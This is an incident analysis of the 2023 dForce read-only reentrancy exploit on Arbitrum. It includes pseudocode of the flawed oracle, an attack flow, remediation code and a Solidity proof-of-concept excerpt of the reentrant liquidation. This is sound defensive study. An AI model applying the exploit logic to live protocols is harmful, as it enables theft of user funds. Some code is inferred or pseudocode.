# dForce — Curve Read-Only Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-09 |
| **Protocol** | dForce |
| **Chain** | Arbitrum |
| **Loss** | ~$3,650,000 |
| **Attacker** | [0x...EOA](https://arbiscan.io/address/0x916792f7734089470de27297903BED8a4630b26D) |
| **Attack Tx** | [0x5db5c240...](https://arbiscan.io/tx/0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd) |
| **Vulnerable Contract** | [dForce iWSTETHCRVGAUGE](https://arbiscan.io/address/0xC462fF1063172BAC6f6823A17ED181a0586f0FC8) |
| **Root Cause** | Stale `virtual_price` used during Curve wstETH/ETH pool ETH callback (read-only reentrancy) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/dForce_exp.sol) |

> **Note**: Per `vm.createSelectFork("arbitrum", 59_527_633)` in the PoC code, this attack occurred on Arbitrum.

---

## 1. Vulnerability Overview

dForce is a Compound-fork-based lending protocol that allowed Curve's `wstETH/ETH` LP token (wstETHCRV-gauge) as collateral. When computing collateral value, it used Curve pool's `virtual_price()` function as an oracle — but because this function is declared as a **read-only (view)** function, it was not protected by a reentrancy guard.

Curve's `remove_liquidity()` function sends an **ETH callback** to the contract recipient when returning ETH. At the moment this callback executes, Curve's internal state has not yet been updated (liquidity is still recorded as not removed), causing `virtual_price()` to temporarily return an **inflated value**.

The attacker called dForce's liquidation function (`liquidateBorrow`) within this callback window, liquidating positions based on the artificially inflated collateral value to extract an illegitimate profit.

### Core Vulnerability Combination

| Vulnerability | Description |
|--------|------|
| Read-Only Reentrancy | `virtual_price()` returns an inflated value when called during the Curve ETH callback |
| Oracle Design Flaw | Curve `virtual_price()` used as oracle without reentrancy protection |
| Flash Loan Exploitation | Large-scale WETH borrowed from multiple protocols to fund the attack |

---

## 2. Vulnerable Code Analysis

### 2.1 Curve Pool — virtual_price Inflation During ETH Callback (Core Vulnerability)

```solidity
// ❌ Vulnerable internal behavior of Curve Pool's remove_liquidity (pseudocode)
function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts)
    external
    returns (uint256[2] memory amounts)
{
    // Step 1: Calculate ETH/wstETH amounts to return
    amounts[0] = token_amount * self.balances[0] / self.token.totalSupply();
    amounts[1] = token_amount * self.balances[1] / self.token.totalSupply();

    // ❌ State update (balances decrease) occurs AFTER ETH transfer
    //    → When ETH is sent, the recipient's fallback() executes at a point
    //      where self.balances has not yet been updated, so virtual_price()
    //      returns an inflated value

    // Step 2: ETH transfer (external callback occurs here!)
    raw_call(msg.sender, b"", value=amounts[0])  // ← callback fires here

    // Step 3: State update (only executes after the callback)
    self.balances[0] -= amounts[0]
    self.balances[1] -= amounts[1]
    self.token.burnFrom(msg.sender, token_amount)
}

// ❌ virtual_price() is a view function, so reentrancy guard cannot be applied
function virtual_price() external view returns (uint256):
    // Calculates value per LP token based on current balances
    // During remove_liquidity callback, balances have not yet been updated,
    // so an inflated value is returned
    return self.get_virtual_price()
```

```solidity
// ✅ Fix: Add read-only reentrancy protection to Curve pool
// (Curve subsequently patched with a reentrancy lock)
uint256 private locked = 1;

modifier nonreentrant():
    assert locked == 1  // ✅ Check reentrancy lock
    locked = 2
    _
    locked = 1

// ✅ Revert view functions when in reentrant state
function virtual_price() external view returns (uint256):
    assert self.locked == 1  // ✅ Revert if currently reentrant
    return self.get_virtual_price()
```

**Problem**: Because `virtual_price()` is a `view` (read-only) function, it cannot be protected by the conventional `nonReentrant` modifier. At the moment the ETH callback fires, the state has not yet been updated, so any external call to this function will read an inflated LP price.

---

### 2.2 dForce Oracle — virtual_price Reference Without Reentrancy Protection

```solidity
// ❌ Vulnerable dForce price oracle (inferred code)
contract PriceOracleV2 {
    ICurvePool public curvePool;

    function getUnderlyingPrice(address _asset) external returns (uint256) {
        if (_asset == address(VWSTETHCRVGAUGE)) {
            // ❌ Directly calls Curve's virtual_price() without reentrancy protection
            //    → If this function is called during a Curve ETH callback,
            //      collateral value based on inflated virtual_price is returned
            uint256 virtualPrice = curvePool.get_virtual_price();
            return virtualPrice * wstETHPrice / 1e18;
        }
        // ...
    }
}
```

```solidity
// ✅ Fixed dForce price oracle
contract PriceOracleV2 {
    ICurvePool public curvePool;

    function getUnderlyingPrice(address _asset) external returns (uint256) {
        if (_asset == address(VWSTETHCRVGAUGE)) {
            // ✅ Check Curve pool's reentrancy lock state first
            require(curvePool.locked() == 1, "Curve pool is in reentrant state");

            uint256 virtualPrice = curvePool.get_virtual_price();
            return virtualPrice * wstETHPrice / 1e18;
        }
    }
}
```

**Problem**: The dForce oracle trusted the external Curve pool's state without accounting for the possibility that the state could be temporarily inconsistent during a callback.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Deploy attacker contract (`ContractTest`) and a separate borrower contract (`Borrower`)
- Set up Curve pool approvals for WSTETH and WSTETHCRV
- Prepare nested flash loans to acquire large-scale WETH needed for the attack

### 3.2 Execution Phase

```
Steps 1–9: Acquire large-scale WETH via nested flash loans
──────────────────────────────────────────────────────────
  Balancer flash loan    → WETH (full balance)
    └▶ AaveV3 flash loan → WETH (full balance)
         └▶ Radiant flash loan → WETH
              └▶ UniswapV3 flash loan → WETH
                   └▶ SushiSwap SLP1 flash loan → WETH
                        └▶ SushiSwap SLP2 flash loan → WETH
                             └▶ SushiSwap SLP3 flash loan → WETH
                                  └▶ Zyber flash loan → WETH
                                       └▶ SwapFlashLoan → WETH
                                            └▶ [Attack execution ↓]
```

```
Step 10: Add liquidity to Curve pool
─────────────────────────────────────
  ETH (WETH unwrap) → Curve wstETH/ETH pool add_liquidity
  → Receive wstETHCRV LP tokens
```

```
Steps 11–13: Supply collateral and borrow USX via Borrower contract
────────────────────────────────────────────────────────────────────
  ContractTest ──▶ Borrower
  Transfer wstETHCRV (1,904,761...)
                  │
                  ▼
            wstETHCRV → Stake into WSTETHCRVGAUGE
                  │
                  ▼
            Supply collateral to dForce iWSTETHCRVGAUGE
                  │
                  ▼
            Borrow USX (~2,080,000 USX)
                  │
                  ▼
            Transfer USX → ContractTest
```

```
Step 14: Call remove_liquidity → ETH callback fires (reentrancy triggered)
───────────────────────────────────────────────────────────────────────────
  ContractTest.executeOperation()
       │
       ▼
  curvePool.remove_liquidity(63,438,591...)  ← ❌ ETH callback fires here!
       │
       │  [Curve internal state not yet updated]
       │  [virtual_price() = inflated value]
       │
       ▼
  ContractTest.fallback() executes  ← ETH receive callback
       │
       ├─▶ PriceOracle.getUnderlyingPrice() → returns inflated price ❌
       │
       ├─▶ dForce.liquidateBorrow(borrower, 560,525,526...)
       │        └▶ Collateral over-valued based on inflated virtual_price
       │           → Liquidate attacker's Borrower position (acquire excess collateral)
       │
       └─▶ dForce.liquidateBorrow(victimAddress2, 300,037,034...)
                └▶ Liquidate another victim's position as well
                   → Acquire additional VWSTETHCRVGAUGE tokens
```

```
Steps 15–20: Profit realization and flash loan repayment
─────────────────────────────────────────────────────────
  VWSTETHCRVGAUGE.redeem() → receive wstETHCRV-gauge
  WSTETHCRVGAUGE.withdraw() → receive wstETHCRV LP tokens
  curvePool.remove_liquidity() (remainder)
  curvePool.exchange(wstETH → ETH)
  WETH.deposit() (ETH → WETH)
  Repay SwapFlashLoan → Zyber → SLP3 → SLP2 → SLP1
      → UniswapV3 → Radiant → AaveV3 → Balancer in sequence
  USX → USDC (curveYSwap.exchange_underlying)
  USDC → WETH (GMXVault.swap)
  Final profit: ~$3,650,000 WETH
```

### 3.3 Attack Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                      Attacker Contract                       │
│  (ContractTest + Borrower)                                   │
└──────────────────────────────┬──────────────────────────────┘
                               │ 1. Begin nested flash loans
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  Flash loan chain (Balancer→AaveV3→Radiant→UniV3→SLP×3→Zyber→Swap) │
│  Acquire ~tens of thousands WETH in total                    │
└──────────────────────────────┬───────────────────────────────┘
                               │ 2. WETH → ETH unwrap
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  Curve wstETH/ETH Pool                                        │
│  add_liquidity(ETH) → receive LP(wstETHCRV)                  │
└──────────────────────────────┬───────────────────────────────┘
                               │ 3. wstETHCRV → Borrower
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  Borrower Contract                                            │
│  wstETHCRV → stake → WSTETHCRVGAUGE                          │
│  WSTETHCRVGAUGE → supply collateral to dForce → borrow USX  │
└──────────────────────────────┬───────────────────────────────┘
                               │ 4. Return USX
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  ContractTest                                                 │
│  Call curvePool.remove_liquidity()                           │
│  ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─┐          │
│    ETH callback fires! Enter fallback()                       │
│  │ [Curve state not updated → virtual_price inflated] │       │
│    ↓                                                          │
│  │ dForce.liquidateBorrow(Borrower) ← ❌ over-valued │        │
│    dForce.liquidateBorrow(victim2)  ← ❌ over-valued          │
│  │ Acquire VWSTETHCRVGAUGE                          │         │
│   ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘          │
│  remove_liquidity resumes (state updated)                     │
└──────────────────────────────┬───────────────────────────────┘
                               │ 5. VWSTETHCRVGAUGE → swap → WETH
                               ▼
                       ✅ Profit realized: ~$3.65M
```

---

## 4. PoC Code (Key Logic Excerpted from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/dForce_exp.sol

// ──────────────────────────────────────────────────
// [Step 18] SwapFlashLoan callback: Core attack execution
// ──────────────────────────────────────────────────
function executeOperation(
    address pool,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata params
) external payable {
    // Unwrap all received WETH to ETH
    uint256 ETHBalance = WETH.balanceOf(address(this));
    WETH.withdraw(ETHBalance);

    // [Step 10] Supply all ETH to Curve wstETH/ETH pool
    // → Receive LP tokens (wstETHCRV)
    uint256 LPAmount = curvePool.add_liquidity{value: ETHBalance}([ETHBalance, 0], 0);

    // Approve USX repayment and dForce liquidation
    USX.approve(address(dForceContract), type(uint256).max);

    // [Step 11] Transfer some wstETHCRV to Borrower contract
    WSTETHCRV.transfer(address(borrower), 1_904_761_904_761_904_761_904);
    borrower.exec(); // [Steps 12–13] Supply collateral → Borrow USX

    // [Step 14] ❌ Trigger core vulnerability: call remove_liquidity
    // When ETH is transferred to this contract during this call, fallback() executes
    // At that moment Curve's internal state has not yet been updated,
    // causing virtual_price() to return an inflated value
    uint256 burnAmount = 63_438_591_176_197_540_597_712;
    curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
    // ↑ During this line's execution, fallback() is called, performing the reentrancy attack

    // Remove remaining LP and exchange wstETH → ETH
    burnAmount = 2_924_339_222_027_299_635_899;
    curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
    curvePool.exchange(1, 0, WSTETH.balanceOf(address(this)), 0);

    // Wrap ETH → WETH and repay flash loan
    address(WETH).call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
    WETH.transfer(address(swapFlashLoan), amount + fee);
}

// ──────────────────────────────────────────────────
// [Reentrancy entry point] fallback() executes on ETH receive
// Entered via ETH transfer callback from Curve's remove_liquidity
// ──────────────────────────────────────────────────
fallback() external payable {
    if (nonce == 0 && msg.sender == address(curvePool)) {
        nonce++; // Prevent duplicate execution (reenter only once)

        // [Step 15] At this point virtual_price() is in an inflated state!
        // Curve's internal balances have not yet decreased
        // → dForce oracle returns over-valued collateral price
        uint256 borrowAmount = dForceContract.borrowBalanceStored(address(borrower));
        uint256 Multiplier = cointroller.closeFactorMantissa();

        // [Step 16] ❌ Liquidate attacker's position based on inflated virtual_price
        // → Acquire more liquidation incentive than actual collateral value
        dForceContract.liquidateBorrow(
            address(borrower),
            560_525_526_525_080_924_601_515, // Liquidation amount (USX)
            address(VWSTETHCRVGAUGE)          // Collateral token to acquire
        );

        // [Step 17] ❌ Also liquidate another victim's position (victimAddress2)
        borrowAmount = dForceContract.borrowBalanceStored(victimAddress2);
        dForceContract.liquidateBorrow(
            victimAddress2,
            300_037_034_111_437_845_493_368,
            address(VWSTETHCRVGAUGE)
        );

        // [Step 18] Redeem acquired VWSTETHCRVGAUGE
        VWSTETHCRVGAUGE.redeem(address(this), VWSTETHCRVGAUGE.balanceOf(address(this)));
        // Withdraw wstETHCRV-gauge
        WSTETHCRVGAUGE.withdraw(WSTETHCRVGAUGE.balanceOf(address(this)));
    }
}

// ──────────────────────────────────────────────────
// Borrower contract: Supply collateral and borrow USX
// ──────────────────────────────────────────────────
contract Borrower {
    function exec() external {
        // [Step 12] Stake wstETHCRV → wstETHCRV-gauge
        WSTETHCRV.approve(address(WSTETHCRVGAUGE), type(uint256).max);
        address(WSTETHCRVGAUGE).call(
            abi.encodeWithSignature("deposit(uint256)", 1_904_761_904_761_904_761_904)
        );

        // [Step 13] Supply collateral to dForce and borrow USX
        WSTETHCRVGAUGE.approve(address(dForceContract), type(uint256).max);
        (bool success,) = address(dForceContract).call(
            abi.encodeWithSelector(
                0x4381c41a,   // mintAndBorrow() selector
                uint256(1),
                WSTETHCRVGAUGE.balanceOf(address(this)),
                2_080_000_000_000_000_000_000_000  // USX amount to borrow
            )
        );
        require(success);
        // Transfer borrowed USX to attacker contract
        USX.transfer(msg.sender, USX.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Incidents |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Read-Only Reentrancy | CRITICAL | CWE-841 | `01_reentrancy.md` | Curve Finance 2023 |
| V-02 | Oracle Manipulation — Stale Price During Reentrancy | CRITICAL | CWE-362 | `04_oracle_manipulation.md` | Harvest Finance 2020 |
| V-03 | Flash Loan-Enabled Large-Scale Liquidity Supply | HIGH | CWE-400 | `02_flash_loan.md` | Euler Finance 2023 |
| V-04 | Liquidation Mechanism Abuse | HIGH | CWE-284 | `18_liquidation.md` | Venus Protocol 2021 |

---

### V-01: Read-Only Reentrancy

- **Description**: When Curve's `remove_liquidity()` function returns ETH, it calls the recipient's fallback/receive function. While this callback is executing, Curve's internal state (balances, totalSupply) has not yet been updated, causing view functions like `virtual_price()` to temporarily return inflated values. Conventional reentrancy guards (`nonReentrant`) only protect state-mutating functions and are not applied to view functions, making this attack possible.
- **Impact**: Within the callback window, dForce's liquidation logic executes based on inflated collateral value, allowing the attacker to acquire far more collateral as liquidation incentive than warranted.
- **Attack Prerequisites**: Supply liquidity to Curve pool then call `remove_liquidity` + a contract capable of receiving ETH + an existing position that meets dForce's liquidation criteria.

---

### V-02: Oracle Manipulation — Stale Price During Reentrancy

- **Description**: The dForce price oracle directly calls Curve's `get_virtual_price()` to assess the value of wstETHCRV LP tokens. This design assumes the Curve pool's state is consistent, but that assumption is violated during the ETH callback.
- **Impact**: Liquidation executes based on inflated collateral value, allowing the attacker to extract an outsized profit.
- **Attack Prerequisites**: Oracle directly depends on external Curve pool state + absence of reentrancy protection.

---

### V-03: Flash Loan-Enabled Large-Scale Liquidity Supply

- **Description**: The attacker obtained large-scale WETH through nested flash loans from over seven protocols including Balancer, AaveV3, Radiant, UniswapV3, SushiSwap, Zyber, and SwapFlashLoan. Supplying this into the Curve pool maximized the effect of the virtual_price manipulation.
- **Impact**: Enables construction of a large collateral position with minimal initial capital.
- **Attack Prerequisites**: Sufficient flash loan liquidity + price impact from large-scale liquidity provision.

---

### V-04: Liquidation Mechanism Abuse

- **Description**: dForce's liquidation function trusts and acts on oracle prices, proceeding with liquidation even when the oracle price is temporarily manipulated. Furthermore, the attacker liquidated not only the `Borrower` contract position they had created, but also a regular user's position (victimAddress2), amplifying the damage.
- **Impact**: Healthy positions with no actual default are liquidated.
- **Attack Prerequisites**: Oracle price manipulation + existence of liquidatable positions.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 dForce Oracle: Check Curve Reentrancy State

```solidity
// ✅ Fixed PriceOracleV2 — verify Curve reentrancy lock
interface ICurvePoolWithLock {
    function locked() external view returns (uint256);
    function get_virtual_price() external view returns (uint256);
}

function getUnderlyingPrice(address _asset) external returns (uint256) {
    if (_asset == address(VWSTETHCRVGAUGE)) {
        ICurvePoolWithLock pool = ICurvePoolWithLock(curvePoolAddress);

        // ✅ Check whether Curve pool is in a reentrant state
        // If locked == 2, currently inside an internal callback → reject price query
        require(pool.locked() == 1, "Oracle: Curve pool is in locked state");

        uint256 virtualPrice = pool.get_virtual_price();
        return computePrice(virtualPrice);
    }
}
```

#### 6.2 dForce Core Functions: Strengthen Reentrancy Prevention

```solidity
// ✅ Apply nonReentrant to liquidation function (verify even if already present)
function liquidateBorrow(
    address _borrower,
    uint256 _repayAmount,
    address _assetCollateral
) external nonReentrant {
    // Liquidation logic
}

// ✅ Or strictly apply Checks-Effects-Interactions pattern
function liquidateBorrow(...) external {
    // [Checks] Validate oracle state when computing collateral value
    uint256 collateralPrice = priceOracle.getUnderlyingPrice(_assetCollateral);
    require(collateralPrice > 0, "Invalid oracle price");

    // [Effects] State changes
    // [Interactions] External calls
}
```

---

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Read-Only Reentrancy | Check reentrancy lock state of external Curve/Balancer pools with ETH callbacks before oracle calls |
| Oracle Design | When using Curve `virtual_price()` as oracle, add TWAP or min/max range validation |
| Oracle Diversification | Mix Chainlink or other external oracles with Curve price; reject when deviation exceeds tolerance |
| Liquidation Circuit Breaker | Set per-block liquidation amount caps or temporarily pause liquidations on sudden price spikes |
| Flash Loan Defense | Detect and restrict the pattern of liquidity supply → immediate liquidation within a single transaction |

---

## 7. Lessons Learned

1. **Read-only reentrancy makes even "safe" view functions dangerous**: `nonReentrant` only protects state-mutating functions. View functions called during an external protocol's ETH callback can return temporarily inconsistent state, so any contract using such functions as an oracle must check the callback state.

2. **Validate reentrancy state when using an external protocol's state as an oracle**: When referencing the price/state of pools with ETH or token callbacks — such as Curve, Balancer, or UniswapV2 — checking whether the pool is currently executing a callback (`locked != 1`) is mandatory.

3. **Never rely on a single oracle source**: If dForce had added deviation validation against an independent oracle like Chainlink rather than relying solely on Curve's `virtual_price()`, this attack could have been prevented.

4. **Nested flash loans effectively eliminate capital barriers**: Nesting flash loans across seven protocols made a large-scale attack possible with virtually no real capital. Security models that depend on liquidity scale are insufficient.

5. **Protocols accepting Curve LP tokens as collateral are especially vulnerable to read-only reentrancy**: LP tokens from Curve pools that handle ETH directly — such as wstETH/ETH and stETH/ETH — require mandatory verification of the Curve pool's reentrancy state when used as collateral.

6. **Recognize the self-liquidation pattern**: The pattern of an attacker liquidating positions they themselves created is superficially indistinguishable from normal liquidation, but when combined with oracle manipulation, it can cause significant damage.

---

## 8. On-Chain Verification

> Attack Tx: [0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd](https://arbiscan.io/tx/0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd)
> Chain: Arbitrum (Block 59,527,633)

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Value | Notes |
|------|--------|------|
| Borrower collateral supplied | 1,904,761,904,761,904,761,904 wstETHCRV-gauge | PoC hardcoded value |
| Borrower USX borrowed | ~2,080,000 USX | `mintAndBorrow` selector 0x4381c41a |
| Liquidation #1 (Borrower) | 560,525,526,525,080,924,601,515 USX repaid | PoC hardcoded value |
| Liquidation #2 (victim2) | 300,037,034,111,437,845,493,368 USX repaid | PoC hardcoded value |
| Final profit | ~$3,650,000 WETH | Based on reported loss |

### 8.2 On-Chain Event Log Sequence (Estimated)

1. `Transfer` — WETH (Balancer → attacker, flash loan)
2. `Transfer` — WETH (AaveV3 aToken → attacker, flash loan)
3. `Transfer` — WETH (Radiant rToken → attacker, flash loan)
4. Nested flash loan chain ...
5. `AddLiquidity` — Curve wstETH/ETH pool (ETH supplied)
6. `Transfer` — wstETHCRV (attacker → Borrower)
7. `Deposit` — WSTETHCRVGAUGE (staking)
8. `MintAndBorrow` — dForce (collateral supplied + USX borrowed)
9. `RemoveLiquidity` — Curve (← reentrancy occurs within this event)
10. `LiquidateBorrow` — dForce (Borrower liquidated)
11. `LiquidateBorrow` — dForce (victim2 liquidated)
12. `Redeem` — dForce VWSTETHCRVGAUGE
13. Sequential flash loan repayments (Transfer WETH)
14. USX → USDC → WETH final swap

### 8.3 Precondition Verification

| Item | Status | Description |
|------|------|------|
| Curve pool ETH balance | Large | Sufficient liquidity secured via flash loans |
| dForce wstETHCRV-gauge market | Active | Collateral acceptance enabled |
| victimAddress2 position | Liquidatable | Liquidatable under inflated virtual_price at time of attack |
| Curve reentrancy lock | Absent | No read-only reentrancy protection in Curve implementation at time of attack |

---

*Reference analysis sources: SlowMist, BlockSec, PeckShield (2023-02-09)*
*Analysis written: 2026-04-11*